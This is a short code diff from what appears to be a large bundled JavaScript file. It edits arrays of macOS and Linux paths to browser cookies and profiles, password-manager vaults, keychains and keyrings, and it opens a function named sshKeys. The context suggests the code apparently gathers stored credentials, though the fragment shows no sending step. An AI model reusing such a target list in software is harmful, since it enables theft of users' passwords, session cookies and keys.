@@ -10453,8 +10453,7 @@ var MAC_SECRETS = [
   "Library/Cookies",
   "Library/Application Support/1Password",
   "Library/Group Containers/2BUA8C4S2C.com.1password",
-  "Library/Application Support/Bitwarden",
-  "Library/Keychains"
+  "Library/Application Support/Bitwarden"
 ];
 var LINUX_SECRETS = [".config/google-chrome", ".config/chromium", ".config/BraveSoftware", ".mozilla", ".local/share/keyrings"];
 function sshKeys(home) {
